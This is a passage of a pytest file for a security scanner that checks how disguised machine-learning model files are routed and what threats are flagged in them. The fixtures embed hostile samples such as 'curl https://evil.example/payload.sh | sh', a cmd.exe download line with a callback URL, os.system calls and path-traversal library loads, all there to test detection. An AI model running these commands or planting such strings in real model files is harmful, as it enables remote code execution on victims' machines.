    result = scan_file(str(model_path), config={"cache_scan_results": False})

    assert result.scanner_name == "pytorch_binary"
    assert result.metadata["supplemental_scanners"] == ["torch7"]
    assert any("Linux executable" in issue.message for issue in result.issues)
    assert any(
        check.name == "Torch7 Lua Execution Primitive Analysis"
        and check.status == CheckStatus.FAILED
        and check.severity == IssueSeverity.CRITICAL
        for check in result.checks
    )


def test_scan_file_merges_r_serialized_security_analysis_for_signature_valid_bin(tmp_path: Path) -> None:
    model_path = tmp_path / "payload.bin"
    model_path.write_bytes(
        b"RDX3\nX\nworkspace\nmodel\nexpression\nlanguage\n"
        b"base::system('curl https://evil.example/payload.sh | sh')\n" + _valid_elf64_header() + b"\x00" * 64
    )

    result = scan_file(str(model_path), config={"cache_scan_results": False})

    assert file_detection.detect_file_format(str(model_path)) == "pytorch_binary"
    assert result.scanner_name == "pytorch_binary"
    assert result.metadata["supplemental_scanners"] == ["r_serialized"]
    assert any("Linux executable" in issue.message for issue in result.issues)
    assert any(
        check.name == "Executable Symbol Context Analysis"
        and check.status == CheckStatus.FAILED
        and check.severity == IssueSeverity.CRITICAL
        for check in result.checks
    )
    assert any(
        check.name == "Serialized Expression Payload Detection"
        and check.status == CheckStatus.FAILED
        and check.severity == IssueSeverity.CRITICAL
        for check in result.checks
    )


@pytest.mark.parametrize(
    "selection_config",
    [
        {"exclude_scanners": ["pytorch_binary"]},
        {"scanners": ["torch7"]},
    ],
    ids=["pytorch-binary-excluded", "torch7-only"],
)
def test_scan_file_routes_malicious_torch7_bin_when_raw_scanner_is_suppressed(
    tmp_path: Path,
    selection_config: dict[str, list[str]],
) -> None:
    model_path = tmp_path / "payload.bin"
    model_path.write_bytes(
        b"T7\x00\x00torch.FloatTensor nn.Sequential\ncmd = os.execute('curl https://evil.example/payload.sh | sh')\n"
    )

    result = scan_file(
        str(model_path),
        config={**selection_config, "cache_scan_results": False},
    )

    assert result.scanner_name == "torch7"
    assert any(
        check.name == "Scanner Selection" and check.details.get("skipped_scanner_id") == "pytorch_binary"
        for check in result.checks
    )
    assert any(
        check.name == "Torch7 Lua Execution Primitive Analysis"
        and check.status == CheckStatus.FAILED
        and check.severity == IssueSeverity.CRITICAL
        for check in result.checks
    )


def test_scan_file_merges_rknn_security_analysis_for_signature_valid_bin(tmp_path: Path) -> None:
    model_path = tmp_path / "payload.bin"
    model_path.write_bytes(
        b"RKNN\x01\x00\x00\x00"
        b"notes=cmd.exe /c curl https://evil.example/payload\n"
        b"callback=http://198.51.100.5:8080/collect\n"
    )

    result = scan_file(str(model_path), config={"cache_scan_results": False})

    assert result.scanner_name == "pytorch_binary"
    assert result.metadata["supplemental_scanners"] == ["rknn"]
    assert any(
        check.name == "RKNN Command and Network Indicator Correlation"
        and check.status == CheckStatus.FAILED
        and check.severity == IssueSeverity.CRITICAL
        for check in result.checks
    )


def test_scan_file_merges_executorch_archive_analysis_for_signature_valid_bin(tmp_path: Path) -> None:
    model_path = tmp_path / "program.bin"
    model_path.write_bytes(b"\x0c\x00\x00\x00ET13\x04\x00\x04\x00\x04\x00\x00\x00")
    with zipfile.ZipFile(model_path, "a") as archive:
        archive.writestr("evil.py", "print('evil')")

    result = scan_file(str(model_path), config={"cache_scan_results": False})

    assert result.scanner_name == "pytorch_binary"
    assert result.metadata["supplemental_scanners"] == ["executorch"]
    assert any(issue.rule_code == "S104" and "evil.py" in (issue.location or "") for issue in result.issues)


def test_scan_file_preflights_over_entry_executorch_archive_before_specialized_routing(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    model_path = tmp_path / "program.bin"
    model_path.write_bytes(b"\x0c\x00\x00\x00ET13\x04\x00\x04\x00\x04\x00\x00\x00")
    with zipfile.ZipFile(model_path, "a") as archive:
        archive.writestr("one.py", "print('one')")
        archive.writestr("two.py", "print('two')")

    def fail_zipfile_open(*_args: Any, **_kwargs: Any) -> Any:
        raise AssertionError("entry-count preflight must reject before specialized routing opens the ZIP")

    monkeypatch.setattr("modelaudit.scanners.zip_scanner.zipfile.ZipFile", fail_zipfile_open)

    result = scan_file(
        str(model_path),
        config={"cache_scan_results": False, "max_zip_entries": 1},
    )

    assert result.scanner_name == "zip"
    assert result.success is False
    assert any(
        check.name == "Entry Count Limit Check"
        and check.status == CheckStatus.FAILED
        and check.details["entry_count_source"] == "central_directory_preflight"
        for check in result.checks
    )


def test_preferred_scanner_does_not_route_generic_zip_bin_to_pickle(tmp_path: Path) -> None:
    model_path = tmp_path / "weights.bin"
    _create_misnamed_zip(model_path, {"metadata.txt": b"not a pickle"})

    assert core_module._select_preferred_scanner_id(str(model_path), "zip", ".bin") == "zip"


def test_scan_file_routes_misnamed_executorch_archive_by_content(tmp_path: Path) -> None:
    disguised_exec = tmp_path / "model.jpg"
    _create_misnamed_zip(
        disguised_exec,
        {
            "bytecode.pkl": pickle.dumps({"weights": [1, 2, 3]}),
            "version": b"1",
            "evil.py": b"print('evil')\n",
        },
    )

    result = scan_file(str(disguised_exec))

    assert result.scanner_name == "executorch"
    assert any(issue.rule_code == "S507" and "evil.py" in (issue.location or "") for issue in result.issues)
    assert any(issue.rule_code == "S104" and "evil.py" in (issue.location or "") for issue in result.issues)


def test_scan_file_does_not_route_non_pytorch_zip_with_generic_pickle(tmp_path: Path) -> None:
    disguised_zip = tmp_path / "weights.jpg"
    _create_misnamed_zip(
        disguised_zip,
        {
            "weights.pkl": pickle.dumps({"weights": [1, 2, 3]}),
            "version": b"1.0",
        },
    )

    result = scan_file(str(disguised_zip))

    assert result.scanner_name == "zip"


def test_scan_file_does_not_route_near_match_executorch_zip_without_numeric_version(tmp_path: Path) -> None:
    disguised_zip = tmp_path / "bytecode.jpg"
    _create_misnamed_zip(
        disguised_zip,
        {
            "bytecode.pkl": pickle.dumps({"weights": [1, 2, 3]}),
            "version": b"dev",
        },
    )

    result = scan_file(str(disguised_zip))

    assert result.scanner_name == "zip"


def test_scan_file_does_not_route_generic_data_pickle_without_pytorch_metadata(tmp_path: Path) -> None:
    disguised_zip = tmp_path / "data.jpg"
    _create_misnamed_zip(disguised_zip, {"data.pkl": pickle.dumps({"weights": [1, 2, 3]})})

    result = scan_file(str(disguised_zip))

    assert result.scanner_name == "zip"


def test_scan_file_routes_misnamed_torchserve_mar_by_content(tmp_path: Path) -> None:
    disguised_mar = tmp_path / "model.jpg"
    manifest = {
        "model": {
            "handler": "handler.py",
            "serializedFile": "model.pkl",
        }
    }
    _create_misnamed_zip(
        disguised_mar,
        {
            "MAR-INF/MANIFEST.json": json.dumps(manifest).encode("utf-8"),
            "handler.py": b"def handle(data, context):\n    return data\n",
            "model.pkl": _build_malicious_pickle(),
        },
    )

    result = scan_file(str(disguised_mar))

    assert result.scanner_name == "torchserve_mar"
    assert any("model.pkl" in (issue.location or "") for issue in result.issues)


def test_scan_file_routes_misnamed_keras_hdf5_by_header(tmp_path: Path) -> None:
    h5py = pytest.importorskip("h5py")

    disguised_h5 = tmp_path / "model.jpg"
    with h5py.File(disguised_h5, "w") as handle:
        handle.attrs["model_config"] = json.dumps(
            {
                "class_name": "Sequential",
                "config": {
                    "name": "test",
                    "layers": [{"class_name": "Lambda", "config": {"function": "lambda x: x * 2"}}],
                },
            }
        )
        handle.attrs["keras_version"] = "3.11.2"

    result = scan_file(str(disguised_h5))

    assert result.scanner_name == "keras_h5"
    assert any("CVE-2025-9905" in issue.message for issue in result.issues)


@pytest.mark.parametrize(
    ("filename", "header_len"),
    [
        ("weights.jpg", SAFETENSORS_ROUTING_HEADER_PARSE_BYTES + 1),
        ("zlib-shaped.unknown", SAFETENSORS_ROUTING_HEADER_PARSE_BYTES + 0x9C78),
    ],
    ids=["generic", "zlib-shaped"],
)
def test_scan_file_routes_oversized_renamed_safetensors_to_inconclusive_scan(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    filename: str,
    header_len: int,
) -> None:
    disguised_safetensors = tmp_path / filename
    _write_sparse_oversized_safetensors_candidate(disguised_safetensors, header_len=header_len)
    monkeypatch.setattr(
        safetensors_scanner.SafeTensorsScanner,
        "calculate_file_hashes",
        lambda _self, _path: pytest.fail("oversized SafeTensors headers must fail before hashing"),
    )

    result = scan_file(str(disguised_safetensors), config={"cache_scan_results": False})

    assert result.scanner_name == "safetensors"
    assert result.success is False
    assert result.metadata["scan_outcome"] == "inconclusive"
    assert "safetensors_header_size_limit_exceeded" in result.metadata["scan_outcome_reasons"]
    limit_check = next(check for check in result.checks if check.name == "Header Size Limit")
    assert limit_check.status == CheckStatus.FAILED
    assert limit_check.severity == IssueSeverity.INFO


@pytest.mark.parametrize(
    ("filename", "header_len"),
    [
        ("weights.jpg", SAFETENSORS_ROUTING_HEADER_PARSE_BYTES + 1),
        ("zlib-shaped.unknown", SAFETENSORS_ROUTING_HEADER_PARSE_BYTES + 0x9C78),
    ],
    ids=["generic", "zlib-shaped"],
)
def test_scan_top_level_oversized_renamed_safetensors_fails_before_hashing(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    filename: str,
    header_len: int,
) -> None:
    disguised_safetensors = tmp_path / filename
    _write_sparse_oversized_safetensors_candidate(disguised_safetensors, header_len=header_len)
    monkeypatch.setattr(
        safetensors_scanner.SafeTensorsScanner,
        "calculate_file_hashes",
        lambda _self, _path: pytest.fail("oversized SafeTensors headers must fail before scanner hashing"),
    )
    monkeypatch.setattr(
        core_module,
        "_calculate_file_hash",
        lambda _path: pytest.fail("oversized SafeTensors top-level inputs must fail before aggregate hashing"),
    )

    result = scan_model_directory_or_file(str(disguised_safetensors), cache_scan_results=False)

    assert result.success is False
    assert core_module.determine_exit_code(result) == 2
    assert "safetensors" in result.scanner_names
    assert any(check.name == "Header Size Limit" for check in result.checks)


def test_tensorflow_inconclusive_safetensors_overlap_fails_closed_without_hashing(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    payload = tmp_path / "overlap.safetensors"
    _write_tensorflow_overlap_safetensors_candidate(payload, b"x")
    cache_dir = tmp_path / "cache"
    config = {
        "cache_enabled": True,
        "cache_dir": str(cache_dir),
        "min_cache_file_size": 0,
        "max_safetensors_header_bytes": 16,
    }
    monkeypatch.setattr(file_detection, "_TF_METAGRAPH_MAX_VALIDATE_BYTES", 1)
    monkeypatch.setattr(
        core_module,
        "_calculate_file_hash",
        lambda _path: pytest.fail("bounded routing overlap must not trigger aggregate hashing"),
    )
    monkeypatch.setattr(
        SecureFileHasher,
        "hash_file",
        lambda _self, _path: pytest.fail("bounded routing overlap must not trigger cache-key hashing"),
    )
    monkeypatch.setattr(
        SecureFileHasher,
        "hash_file_with_stat",
        lambda _self, _path, _stat: pytest.fail("bounded routing overlap must not trigger cache validation hashing"),
    )

    assert file_detection.detect_file_format(str(payload)) == TENSORFLOW_PROTOBUF_ROUTING_INCONCLUSIVE_FORMAT
    assert file_detection.should_defer_safetensors_header_limit_hash(str(payload), 16)

    reset_cache_manager()
    try:
        direct = scan_file(str(payload), config=config)
        aggregate = scan_model_directory_or_file(
            str(payload),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
            max_safetensors_header_bytes=16,
        )

        assert direct.metadata["operational_error_reason"] == "tensorflow_protobuf_routing_incomplete"
        assert aggregate.success is False
        assert core_module.determine_exit_code(aggregate) == 2
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_valid_safetensors_framing_precedes_ambiguous_tensorflow_probe(tmp_path: Path) -> None:
    payload = tmp_path / "tensorflow-prefix-safetensors.unknown"
    header_length = int.from_bytes(bytes([0x08, 0x01, 0x79, 0, 0, 0, 0, 0]), "little")
    metadata = json.dumps(
        {"t": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]}},
        separators=(",", ":"),
    ).encode()
    payload.write_bytes(struct.pack("<Q", header_length) + metadata + (b" " * (header_length - len(metadata))) + b"X")

    assert file_detection.detect_file_format(str(payload)) == "safetensors"
    assert file_detection.detect_file_format_from_magic(str(payload)) == "safetensors"
    assert file_detection.detect_file_format_for_skip_filter(str(payload)) == "safetensors"

    result = scan_file(str(payload), config={"cache_enabled": False})

    assert result.scanner_name == "safetensors"
    assert result.success is True
    assert not result.issues


def test_scan_file_routes_misnamed_gguf_by_header(tmp_path: Path) -> None:
    disguised_gguf = create_mock_gguf(tmp_path / "model.payload")

    result = scan_file(str(disguised_gguf))

    assert result.scanner_name == "gguf"
    assert result.metadata["format"] == "gguf"


@pytest.mark.parametrize("filename", ["model.jpg", "model.json", "model.onnx", "payload.params", "payload-0000.params"])
def test_scan_file_routes_misnamed_mxnet_symbol_and_detects_custom_library(tmp_path: Path, filename: str) -> None:
    disguised_symbol = create_mock_mxnet_symbol(
        tmp_path / filename,
        custom_library="../../tmp/libevil.so",
    )

    result = scan_file(str(disguised_symbol))

    assert result.scanner_name == "mxnet"
    assert any(
        issue.message == "Suspicious library reference in MXNet graph attributes"
        and issue.details.get("attribute") == "library"
        for issue in result.issues
    )


def test_scan_file_routes_bom_prefixed_params_symbol_and_detects_custom_library(tmp_path: Path) -> None:
    disguised_symbol = tmp_path / "payload-0000.params"
    disguised_symbol.write_text(
        '\ufeff{"nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
        '"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_file(str(disguised_symbol))

    assert result.scanner_name == "mxnet"
    assert any(issue.details.get("attribute") == "library" for issue in result.issues)


def test_scan_file_fails_closed_for_renamed_mxnet_shadowed_nodes(tmp_path: Path) -> None:
    disguised_symbol = tmp_path / "payload.jpg"
    disguised_symbol.write_text(
        '{"nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
        '"arg_nodes":[0],"heads":[[0,0,0]],"nodes":[{"op":"null","name":"data"}]}',
        encoding="utf-8",
    )

    result = scan_file(str(disguised_symbol), config={"cache_enabled": False})

    assert result.scanner_name == "mxnet"
    assert result.success is False
    assert "mxnet_symbol_duplicate_root_keys" in result.metadata["scan_outcome_reasons"]
    assert any(
        check.name == "MXNet Symbol JSON Analysis" and check.details.get("duplicate_root_keys") == ["nodes"]
        for check in result.checks
    )


def test_scan_file_fails_closed_for_renamed_oversized_mxnet_symbol_prefix(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
    monkeypatch.setattr(mxnet_scanner, "MAX_SYMBOL_READ_BYTES", 128)
    disguised_symbol = tmp_path / "large.jpg"
    disguised_symbol.write_text(
        '{"nodes":[{"op":"Custom","name":"custom_loader"}],"arg_nodes":[0],"heads":[[0,0,0]],"padding":"'
        + ("x" * 256)
        + '"}',
        encoding="utf-8",
    )

    result = scan_file(str(disguised_symbol))

    assert result.scanner_name == "mxnet"
    assert result.success is False
    assert "mxnet_symbol_truncated" in result.metadata["scan_outcome_reasons"]


def test_scan_file_canonical_mxnet_symbol_bypasses_routing_value_budget(tmp_path: Path) -> None:
    symbol_path = tmp_path / "large-symbol.json"
    symbol_path.write_text(
        '{"padding":['
        + ",".join("0" for _ in range(5000))
        + '],"nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
        '"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_file(str(symbol_path), config={"cache_enabled": False})

    assert result.scanner_name == "mxnet"
    assert any(issue.details.get("attribute") == "library" for issue in result.issues)
    assert "mxnet_symbol_routing_incomplete" not in result.metadata.get("scan_outcome_reasons", [])


def test_scan_file_small_renamed_mxnet_value_budget_before_structure_fails_closed(tmp_path: Path) -> None:
    model_path = tmp_path / "padded.jpg"
    model_path.write_text(
        '{"padding":['
        + ",".join("0" for _ in range(5000))
        + '],"nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
        '"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_file(str(model_path), config={"cache_scan_results": False})

    assert model_path.stat().st_size < file_detection.MXNET_SYMBOL_SIGNATURE_READ_BYTES
    assert result.scanner_name == "unknown"
    assert result.success is False
    assert "mxnet_symbol_routing_incomplete" in result.metadata["scan_outcome_reasons"]


def test_scan_file_generic_json_value_budget_before_mxnet_structure_detects_library(tmp_path: Path) -> None:
    model_path = tmp_path / "model.json"
    model_path.write_text(
        '{"padding":['
        + ",".join("0" for _ in range(5000))
        + '],"nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
        '"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_file(str(model_path), config={"cache_scan_results": False})

    assert model_path.stat().st_size < file_detection.MXNET_SYMBOL_SIGNATURE_READ_BYTES
    assert result.scanner_name == "mxnet"
    assert any(issue.details.get("attribute") == "library" for issue in result.issues)


def test_scan_file_fails_closed_for_post_budget_shadowed_mxnet_nodes(tmp_path: Path) -> None:
    model_path = tmp_path / "config.json"
    model_path.write_text(
        '{"padding":['
        + ",".join("0" for _ in range(5000))
        + '],"nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
        '"nodes":[],"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_file(str(model_path), config={"cache_scan_results": False})

    assert result.success is False
    assert "mxnet_symbol_routing_incomplete" in result.metadata["scan_outcome_reasons"]


@pytest.mark.parametrize("filename", ["model.json", "model.jpg"])
def test_scan_file_mxnet_symbol_with_python_json_nonfinite_constant_detects_library(
    tmp_path: Path,
    filename: str,
) -> None:
    model_path = tmp_path / filename
    model_path.write_text(
        '{"padding":NaN,"nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
        '"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_file(str(model_path), config={"cache_scan_results": False})

    assert result.scanner_name == "mxnet"
    assert any(issue.details.get("attribute") == "library" for issue in result.issues)


def test_scan_file_generic_json_hint_before_value_budget_resolves_later_mxnet_structure(tmp_path: Path) -> None:
    model_path = tmp_path / "model.json"
    model_path.write_text(
        '{"heads":[[0,0,0]],"padding":['
        + ",".join("0" for _ in range(5000))
        + '],"nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
        '"arg_nodes":[0]}',
        encoding="utf-8",
    )

    result = scan_file(str(model_path), config={"cache_scan_results": False})

    assert result.scanner_name == "mxnet"
    assert any(issue.details.get("attribute") == "library" for issue in result.issues)


def test_scan_file_generic_array_heads_before_value_budget_without_mxnet_structure_uses_existing_owner(
    tmp_path: Path,
) -> None:
    config_path = tmp_path / "config.json"
    config_path.write_text(
        '{"heads":["classification"],"padding":[' + ",".join("0" for _ in range(5000)) + "]}",
        encoding="utf-8",
    )

    result = scan_file(str(config_path))

    assert result.scanner_name == "manifest"
    assert "mxnet_symbol_routing_incomplete" not in result.metadata.get("scan_outcome_reasons", [])


def test_scan_file_canonical_mxnet_symbol_preserves_xgboost_overlap_analysis(tmp_path: Path) -> None:
    symbol_path = tmp_path / "polyglot-symbol.json"
    symbol_path.write_text(
        '{"padding":['
        + ",".join("0" for _ in range(5000))
        + '],"version":[1,7,4],"learner":{"gradient_booster":{},"malicious_code":"os.system()"},'
        '"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_file(str(symbol_path), config={"cache_enabled": False})

    assert result.scanner_name == "mxnet"
    assert "xgboost_mxnet_symbol_overlap" not in result.metadata.get("scan_outcome_reasons", [])
    assert any("Suspicious pattern detected: System call in JSON" in issue.message for issue in result.issues)


@pytest.mark.parametrize(
    "payload",
    [
        '{"nodes":[{"attrs":"' + ("x" * 129) + '","op":"Custom","name":"load"}],"arg_nodes":[0],"heads":[[0,0,0]]}',
        '{"heads":[[0,0,0]],"padding":"' + ("x" * 129) + '","nodes":[{"op":"Custom","name":"load"}],"arg_nodes":[0]}',
    ],
)
def test_scan_file_fails_closed_for_bounded_mxnet_routing_ambiguity(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    payload: str,
) -> None:
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
    disguised_symbol = tmp_path / "ambiguous.jpg"
    disguised_symbol.write_text(payload, encoding="utf-8")

    result = scan_file(str(disguised_symbol))

    assert result.scanner_name == "unknown"
    assert result.success is False
    assert "mxnet_symbol_routing_incomplete" in result.metadata["scan_outcome_reasons"]
    check = next(check for check in result.checks if check.name == "MXNet Symbol Routing")
    assert "bounded JSON probe reached its limit" in check.message


def test_scan_file_inconclusive_mxnet_route_composes_jax_analysis(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
    model_path = tmp_path / "ambiguous-jax.jpg"
    model_path.write_text(
        json.dumps(
            {
                "framework": "jax",
                "nodes": [{"attrs": "x" * 129, "op": "Custom", "name": "load"}],
                "arg_nodes": [0],
                "heads": [[0, 0, 0]],
                "payload": "jax.experimental.host_callback.call(os.system, 'id')",
            }
        ),
        encoding="utf-8",
    )

    result = scan_file(str(model_path), config={"cache_scan_results": False})

    assert result.scanner_name == "unknown"
    assert "mxnet_symbol_routing_incomplete" in result.metadata["scan_outcome_reasons"]
    assert any(
        check.name == "JSON Pattern Security Check" and check.status == CheckStatus.FAILED for check in result.checks
    )
    aggregate = scan_model_directory_or_file(str(model_path), cache_scan_results=False)
    assert any("Suspicious pattern in JSON checkpoint" in issue.message for issue in aggregate.issues)
    assert core_module.determine_exit_code(aggregate) == 2


def test_scan_file_inconclusive_mxnet_route_composes_escaped_suffix_owned_jax_payload_without_root_marker(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
    model_path = tmp_path / "ambiguous-jax.checkpoint"
    model_path.write_text(
        json.dumps(
            {
                "nodes": [{"attrs": "x" * 129, "op": "Custom", "name": "load"}],
                "arg_nodes": [0],
                "heads": [[0, 0, 0]],
                "payload": "jax.experimental.io_callback",
            }
        ).replace("jax.experimental.io_callback", r"j\u0061x.experimental.io_callback"),
        encoding="utf-8",
    )

    result = scan_file(str(model_path), config={"cache_scan_results": False})

    assert result.scanner_name == "unknown"
    assert "mxnet_symbol_routing_incomplete" in result.metadata["scan_outcome_reasons"]
    assert any(
        check.name == "JSON Pattern Security Check" and check.status == CheckStatus.FAILED for check in result.checks
    )


def test_scan_file_inconclusive_mxnet_route_does_not_compose_ambiguous_large_foreign_json(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
    model_path = tmp_path / "ambiguous-large-foreign.jpg"
    model_path.write_text(
        json.dumps(
            {
                "nodes": [{"attrs": "x" * 129, "op": "Custom", "name": "load"}],
                "arg_nodes": [0],
                "heads": [[0, 0, 0]],
                "padding": "x" * (JAX_JSON_CHECKPOINT_ROUTING_READ_BYTES + 16),
            }
        ),
        encoding="utf-8",
    )

    result = scan_file(str(model_path), config={"cache_scan_results": False})

    assert result.scanner_name == "unknown"
    assert result.metadata["scan_outcome_reasons"] == ["mxnet_symbol_routing_incomplete"]
    assert not any(check.name == "JSON Checkpoint Analysis Limit" for check in result.checks)


def test_scan_file_inconclusive_mxnet_route_preserves_jax_incomplete_reason(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
    nested_payload: dict[str, Any] = {"value": "safe"}
    for _ in range(2 * JaxCheckpointScanner._MAX_METADATA_TRAVERSAL_DEPTH):
        nested_payload = {"nested": nested_payload}
    model_path = tmp_path / "ambiguous-deep-jax.jpg"
    model_path.write_text(
        json.dumps(
            {
                "framework": "jax",
                "nodes": [{"attrs": "x" * 129, "op": "Custom", "name": "load"}],
                "arg_nodes": [0],
                "heads": [[0, 0, 0]],
                "payload": nested_payload,
            }
        ),
        encoding="utf-8",
    )

    result = scan_file(str(model_path), config={"cache_scan_results": False})
    aggregate = scan_model_directory_or_file(str(model_path), cache_scan_results=False)

    assert result.scanner_name == "unknown"
    assert result.metadata["scan_outcome_reasons"] == [
        "jax_metadata_traversal_depth_limit",
        "mxnet_symbol_routing_incomplete",
    ]
    assert any(check.name == "JSON Metadata Traversal Depth Limit" for check in result.checks)
    assert core_module.determine_exit_code(aggregate) == 2


def test_scan_file_incomplete_mxnet_routing_is_exit2_and_not_cached(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
    disguised_symbol = tmp_path / "ambiguous.jpg"
    disguised_symbol.write_text(
        '{"nodes":[{"attrs":"' + ("x" * 129) + '","op":"Custom","name":"load"}],"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )
    cache_dir = tmp_path / "cache"

    reset_cache_manager()
    try:
        first = scan_model_directory_or_file(
            str(disguised_symbol),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )
        second = scan_model_directory_or_file(
            str(disguised_symbol),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )

        for aggregate in (first, second):
            metadata = aggregate.file_metadata[str(disguised_symbol)]
            assert aggregate.success is False
            assert metadata["scan_outcome"] == "inconclusive"
            assert "mxnet_symbol_routing_incomplete" in metadata["scan_outcome_reasons"]
            assert core_module.determine_exit_code(aggregate) == 2
            assert any(
                check.name == "MXNet Symbol Routing" and "bounded JSON probe reached its limit" in check.message
                for check in aggregate.checks
            )
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_scan_file_reuses_trusted_mxnet_content_route(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    disguised_symbol = create_mock_mxnet_symbol(tmp_path / "model.jpg")
    original_detect = file_detection.detect_mxnet_symbol_content_route
    calls = 0

    def count_detects(path: str | Path) -> str | None:
        nonlocal calls
        calls += 1
        return original_detect(path)

    monkeypatch.setattr(file_detection, "detect_mxnet_symbol_content_route", count_detects)

    result = scan_file(str(disguised_symbol))

    assert result.scanner_name == "mxnet"
    assert calls == 1


def test_scan_file_routes_conclusive_xgboost_json_before_mxnet_ambiguity(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
    model_path = tmp_path / "booster.json"
    model_path.write_text(
        '{"version":[1,7,4],"learner":{"gradient_booster":{},"padding":"' + ("x" * 256) + '"}}',
        encoding="utf-8",
    )

    result = scan_file(str(model_path))

    assert result.scanner_name == "xgboost"
    assert "mxnet_symbol_routing_incomplete" not in result.metadata.get("scan_outcome_reasons", [])


def test_scan_file_routes_xgboost_json_with_markers_after_mxnet_probe_budget(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
    model_path = tmp_path / "delayed-booster.json"
    model_path.write_text(
        '{"padding":"' + ("x" * 256) + '","version":[1,7,4],'
        '"learner":{"gradient_booster":{},"malicious_code":"os.system()"}}',
        encoding="utf-8",
    )

    result = scan_file(str(model_path), config={"cache_enabled": False})

    assert result.scanner_name == "xgboost"
    assert "mxnet_symbol_routing_incomplete" not in result.metadata.get("scan_outcome_reasons", [])
    assert any("Suspicious pattern detected: System call in JSON" in issue.message for issue in result.issues)


def test_scan_file_fails_closed_for_xgboost_mxnet_json_overlap(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
    model_path = tmp_path / "polyglot.json"
    model_path.write_text(
        '{"version":[1,7,4],"learner":{"gradient_booster":{}},"nodes":[{"op":"Custom","name":"load",'
        '"attrs":{"library":"../../tmp/libevil.so","padding":"'
        + ("x" * 256)
        + '"}}],'
        + '"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_file(str(model_path))

    assert result.scanner_name == "xgboost"
    assert result.success is False
    assert "xgboost_mxnet_symbol_overlap" in result.metadata["scan_outcome_reasons"]
    assert any(issue.details.get("attribute") == "library" for issue in result.issues)


def test_scan_file_bom_prefixed_params_runs_xgboost_mxnet_overlap_analysis(tmp_path: Path) -> None:
    model_path = tmp_path / "polyglot-0000.params"
    model_path.write_text(
        '\ufeff{"version":[1,7,4],"learner":{"gradient_booster":{}},'
        '"nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
        '"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_file(str(model_path), config={"cache_enabled": False})

    assert result.scanner_name == "xgboost"
    assert result.success is False
    assert "xgboost_mxnet_symbol_overlap" in result.metadata["scan_outcome_reasons"]
    assert any(issue.details.get("attribute") == "library" for issue in result.issues)


def test_scan_file_xgboost_owned_params_preserves_raw_signature_findings(tmp_path: Path) -> None:
    model_path = tmp_path / "polyglot-0000.params"
    model_path.write_bytes(
        b'{"version":[1,7,4],"learner":{"gradient_booster":{}},'
        b'"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]],'
